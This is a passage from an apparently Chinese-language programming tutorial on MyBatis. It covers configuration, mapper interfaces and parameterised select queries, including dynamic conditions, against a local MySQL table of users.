<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.11<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.4.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.32<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>创建一个Mybatis配置文件mybatis-config.xml，包含数据库配置信息</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">configuration</span></span></span><br><span class="line"><span class="meta">        <span class="keyword">PUBLIC</span> <span class="string">&quot;-//mybatis.org//DTD Config 3.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="string">&quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- mybatis的主配置文件 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 配置环境 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">environments</span> <span class="attr">default</span>=<span class="string">&quot;development&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 配置mysql的环境 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">environment</span> <span class="attr">id</span>=<span class="string">&quot;development&quot;</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 配置事务的类型 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">transactionManager</span> <span class="attr">type</span>=<span class="string">&quot;JDBC&quot;</span>/&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 配置数据源（连接池） --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">type</span>=<span class="string">&quot;POOLED&quot;</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!-- 配置连接数据库的四个基本信息 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driver&quot;</span> <span class="attr">value</span>=<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span> <span class="attr">value</span>=<span class="string">&quot;jdbc:mysql://localhost:3306/test?useSSL=false&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;root&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;root&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">environment</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">environments</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mappers</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 指定映射配置文件的位置 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mapper</span> <span class="attr">resource</span>=<span class="string">&quot;UserMapper.xml&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mappers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>创建User类对象和SQL映射文件UserMapper.xml</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Integer id;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">    <span class="keyword">private</span> String address;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">getId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setId</span><span class="params">(Integer id)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUsername</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUsername</span><span class="params">(String username)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.username = username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getPassword</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setPassword</span><span class="params">(String password)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.password = password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(Integer age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getAddress</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAddress</span><span class="params">(String address)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.address = address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;id=&quot;</span> + id +</span><br><span class="line">                <span class="string">&quot;, username=&#x27;&quot;</span> + username + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, password=&#x27;&quot;</span> + password + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&quot;, address=&#x27;&quot;</span> + address + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>UserMapper.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">mapper</span></span></span><br><span class="line"><span class="meta">        <span class="keyword">PUBLIC</span> <span class="string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 名称空间，可区分不同mapping文件中的id标识 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">&quot;test&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;selectAll&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;org.example.User&quot;</span>&gt;</span></span><br><span class="line">        select * from tb_user;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>编写代码MybatisDemo</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.io.Resources;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.session.SqlSession;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.session.SqlSessionFactory;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.session.SqlSessionFactoryBuilder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MybatisDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">// 1.读取配置文件</span></span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Resources.getResourceAsStream(<span class="string">&quot;mybatis-config.xml&quot;</span>);</span><br><span class="line">        <span class="comment">// 2.创建SqlSessionFactory工厂</span></span><br><span class="line">        <span class="type">SqlSessionFactory</span> <span class="variable">sqlSessionFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SqlSessionFactoryBuilder</span>().build(in);</span><br><span class="line">        <span class="comment">// 3.使用工厂生产SqlSession对象</span></span><br><span class="line">        <span class="type">SqlSession</span> <span class="variable">sqlSession</span> <span class="operator">=</span> sqlSessionFactory.openSession();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4.执行sql</span></span><br><span class="line">        List&lt;User&gt; users = sqlSession.selectList(<span class="string">&quot;test.selectAll&quot;</span>);</span><br><span class="line">        System.out.print(users);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5.释放资源</span></span><br><span class="line">        sqlSession.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="Mapper代理开发"><a href="#Mapper代理开发" class="headerlink" title="Mapper代理开发"></a>Mapper代理开发</h1><p>上面代码中<code>List&lt;User&gt; users = sqlSession.selectList(&quot;test.selectAll&quot;);</code>硬编码依旧存在</p>
<h2 id="遵循规则"><a href="#遵循规则" class="headerlink" title="遵循规则"></a>遵循规则</h2><ol>
<li>定义与SQL映射文件同名的Mapper接口，并且将Mapper接口和SQL映射文件放置在同一目录下</li>
<li>设置SQL映射文件的namespace属性为Mapper接口全限定名</li>
<li>在Mapper接口中定义方法，方法名就是SQL映射文件中的SQL语句的id，并保持参数类型和返回值类型一致</li>
<li>编码<ul>
<li>通过SqlSession的getMapper方法获取Mapper接口的代理对象</li>
<li>调用对应方法完成SQL的执行</li>
</ul>
</li>
</ol>
<h2 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h2><ol>
<li><p>定义一个UserMapper接口，将之前的UserMapper.xml映射文件放在同一目录下</p>
</li>
<li><p>修改映射文件的namespace</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">mapper</span></span></span><br><span class="line"><span class="meta">        <span class="keyword">PUBLIC</span> <span class="string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 名称空间，可区分不同mapping文件中的id标识 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">&quot;org.example.mapper.UserMapper&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;selectAll&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;org.example.User&quot;</span>&gt;</span></span><br><span class="line">        select * from tb_user;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>在Mapper接口中定义方法，UserMapper接口文件中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.mapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.example.User;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserMapper</span> &#123;</span><br><span class="line">    List&lt;User&gt; <span class="title function_">selectAll</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>Mybatis配置文件mybatis-config.xml需要修改下面地方</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mappers</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 指定映射配置文件的位置 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mapper</span> <span class="attr">resource</span>=<span class="string">&quot;org/example/mapper/UserMapper.xml&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mappers</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>注：如果Mapper接口名称和SQL映射文件名称相同，并且在同一目录下，则可以使用包扫描的方式简化SQL映射文件的加载</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mappers</span>&gt;</span></span><br><span class="line">     	<span class="comment">&lt;!-- 两种方式二选一 --&gt;</span>   </span><br><span class="line">        <span class="comment">&lt;!-- 指定映射配置文件的位置 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mapper</span> <span class="attr">resource</span>=<span class="string">&quot;org/example/mapper/UserMapper.xml&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- Mapper代理方式 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;org.example.mapper&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mappers</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>编码MybatisDemo2</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.io.Resources;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.session.SqlSession;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.session.SqlSessionFactory;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.session.SqlSessionFactoryBuilder;</span><br><span class="line"><span class="keyword">import</span> org.example.mapper.UserMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MybatisDemo2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">// 1.读取配置文件</span></span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Resources.getResourceAsStream(<span class="string">&quot;mybatis-config.xml&quot;</span>);</span><br><span class="line">        <span class="comment">// 2.创建SqlSessionFactory工厂</span></span><br><span class="line">        <span class="type">SqlSessionFactory</span> <span class="variable">sqlSessionFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SqlSessionFactoryBuilder</span>().build(in);</span><br><span class="line">        <span class="comment">// 3.使用工厂生产SqlSession对象</span></span><br><span class="line">        <span class="type">SqlSession</span> <span class="variable">sqlSession</span> <span class="operator">=</span> sqlSessionFactory.openSession();</span><br><span class="line">        <span class="comment">// 4.执行sql</span></span><br><span class="line">        <span class="comment">// List&lt;User&gt; users = sqlSession.selectList(&quot;test.selectAll&quot;);</span></span><br><span class="line">        <span class="comment">// 4.1 获取UserMapper接口的代理对象</span></span><br><span class="line">        <span class="type">UserMapper</span> <span class="variable">userMapper</span> <span class="operator">=</span> sqlSession.getMapper(UserMapper.class);</span><br><span class="line">        List&lt;User&gt; users = userMapper.selectAll();</span><br><span class="line">        System.out.print(users);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5.释放资源</span></span><br><span class="line">        sqlSession.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h1><h2 id="查询所有"><a href="#查询所有" class="headerlink" title="查询所有"></a>查询所有</h2><p>3.2中的例子已经展示</p>
<h2 id="查询单个"><a href="#查询单个" class="headerlink" title="查询单个"></a>查询单个</h2><p>根据用户id查询对应的User</p>
<p>UserMapper.xml中添加SQL语句</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;selectById&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;org.example.User&quot;</span>&gt;</span></span><br><span class="line">        select * from tb_user where id=#&#123;id&#125;;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>UserMapper接口中添加方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">User <span class="title function_">selectById</span><span class="params">(<span class="type">int</span> id)</span>;</span><br></pre></td></tr></table></figure>

<p>测试方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">selectById</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// 获取请求参数对象</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">id</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1.读取配置文件</span></span><br><span class="line">    <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Resources.getResourceAsStream(<span class="string">&quot;mybatis-config.xml&quot;</span>);</span><br><span class="line">    <span class="comment">// 2.创建SqlSessionFactory工厂</span></span><br><span class="line">    <span class="type">SqlSessionFactory</span> <span class="variable">sqlSessionFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SqlSessionFactoryBuilder</span>().build(in);</span><br><span class="line">    <span class="comment">// 3.使用工厂生产SqlSession对象</span></span><br><span class="line">    <span class="type">SqlSession</span> <span class="variable">sqlSession</span> <span class="operator">=</span> sqlSessionFactory.openSession();</span><br><span class="line">    <span class="comment">// 4.1 获取UserMapper接口的代理对象</span></span><br><span class="line">    <span class="type">UserMapper</span> <span class="variable">userMapper</span> <span class="operator">=</span> sqlSession.getMapper(UserMapper.class);</span><br><span class="line">    <span class="comment">// 4.2 执行SQL语句</span></span><br><span class="line">    <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> userMapper.selectById(id);</span><br><span class="line">    System.out.print(user);</span><br><span class="line">    <span class="comment">// 5.释放资源</span></span><br><span class="line">    sqlSession.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="多条件查询"><a href="#多条件查询" class="headerlink" title="多条件查询"></a>多条件查询</h2><p>根据年龄和地址查询用户</p>
<p>UserMapper.xml中添加SQL语句</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;selectByCondition&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;org.example.User&quot;</span>&gt;</span></span><br><span class="line">        select * from tb_user where age=#&#123;age&#125; and address like #&#123;address&#125;;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>UserMapper接口中添加方法，存在3种方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 方法1:直接传参</span></span><br><span class="line"><span class="comment">// List&lt;User&gt; selectByCondition(@Param(&quot;age&quot;) int age, @Param(&quot;address&quot;) String address);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法2:传递对象</span></span><br><span class="line"><span class="comment">// List&lt;User&gt; selectByCondition(User user);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法2:传递Map</span></span><br><span class="line">List&lt;User&gt; <span class="title function_">selectByCondition</span><span class="params">(Map map)</span>;</span><br></pre></td></tr></table></figure>

<p>测试方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">selectByConditicon</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// 获取请求参数对象</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> <span class="number">23</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">address</span> <span class="operator">=</span> <span class="string">&quot;Beijing&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理参数</span></span><br><span class="line">    address = <span class="string">&quot;%&quot;</span> + address + <span class="string">&quot;%&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 封装对象</span></span><br><span class="line">    <span class="comment">// User user = new User();</span></span><br><span class="line">    <span class="comment">// user.setAge(age);</span></span><br><span class="line">    <span class="comment">// user.setAddress(address);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构造map</span></span><br><span class="line">    <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    map.put(<span class="string">&quot;age&quot;</span>,age);</span><br><span class="line">    map.put(<span class="string">&quot;address&quot;</span>,address);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1.读取配置文件</span></span><br><span class="line">    <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Resources.getResourceAsStream(<span class="string">&quot;mybatis-config.xml&quot;</span>);</span><br><span class="line">    <span class="comment">// 2.创建SqlSessionFactory工厂</span></span><br><span class="line">    <span class="type">SqlSessionFactory</span> <span class="variable">sqlSessionFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SqlSessionFactoryBuilder</span>().build(in);</span><br><span class="line">    <span class="comment">// 3.使用工厂生产SqlSession对象</span></span><br><span class="line">    <span class="type">SqlSession</span> <span class="variable">sqlSession</span> <span class="operator">=</span> sqlSessionFactory.openSession();</span><br><span class="line">    <span class="comment">// 4.1 获取UserMapper接口的代理对象</span></span><br><span class="line">    <span class="type">UserMapper</span> <span class="variable">userMapper</span> <span class="operator">=</span> sqlSession.getMapper(UserMapper.class);</span><br><span class="line">    <span class="comment">// 4.2 执行SQL语句</span></span><br><span class="line">    <span class="comment">// 使用UserMapper接口方法1</span></span><br><span class="line">    <span class="comment">// List&lt;User&gt; users = userMapper.selectByCondition(age, address);</span></span><br><span class="line">    <span class="comment">// 使用UserMapper接口方法2</span></span><br><span class="line">    <span class="comment">// List&lt;User&gt; users = userMapper.selectByCondition(user);</span></span><br><span class="line">    <span class="comment">// 使用UserMapper接口方法3</span></span><br><span class="line">    List&lt;User&gt; users = userMapper.selectByCondition(map);</span><br><span class="line">    System.out.print(users);</span><br><span class="line">    <span class="comment">// 5.释放资源</span></span><br><span class="line">    sqlSession.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="多条件-动态条件查询"><a href="#多条件-动态条件查询" class="headerlink" title="多条件-动态条件查询"></a>多条件-动态条件查询</h2><p>在多条件查询的时候，也许某个参数的值为空，则上面sql语句会查询失败，使用动态查询</p>
<p>UserMapper.xml中修改SQL语句</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;selectByCondition&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;org.example.User&quot;</span>&gt;</span></span><br><span class="line">    select *</span><br><span class="line">    from tb_user</span><br><span class="line">    <span class="tag">&lt;<span class="name">where</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;age != null&quot;</span>&gt;</span></span><br><span class="line">            and age = #&#123;age&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;address != null and address != &#x27;&#x27;&quot;</span>&gt;</span></span><br><span class="line">            and address like #&#123;address&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">where</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="单条件-动态条件查询"><a href="#单条件-动态条件查询" class="headerlink" title="单条件-动态条件查询"></a>单条件-动态条件查询</h2><p>从age或者address中选一个参数或者两个都不选进行查询</p>
<p>UserMapper.xml中添加SQL语句</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;selectByConditionSingle&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;org.example.User&quot;</span>&gt;</span></span><br><span class="line">    select *</span><br><span class="line">    from tb_user</span><br><span class="line">    <span class="tag">&lt;<span class="name">where</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">choose</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">when</span> <span class="attr">test</span>=<span class="string">&quot;age != null&quot;</span>&gt;</span></span><br><span class="line">                age = #&#123;age&#125;</span><br><span class="line">            <span class="tag">&lt;/<span class="name">when</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">when</span> <span class="attr">test</span>=<span class="string">&quot;address != null and address != &#x27;&#x27;&quot;</span>&gt;</span></span><br><span class="line">                address like #&#123;address&#125;</span><br><span class="line">            <span class="tag">&lt;/<span class="name">when</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">choose</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">where</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>

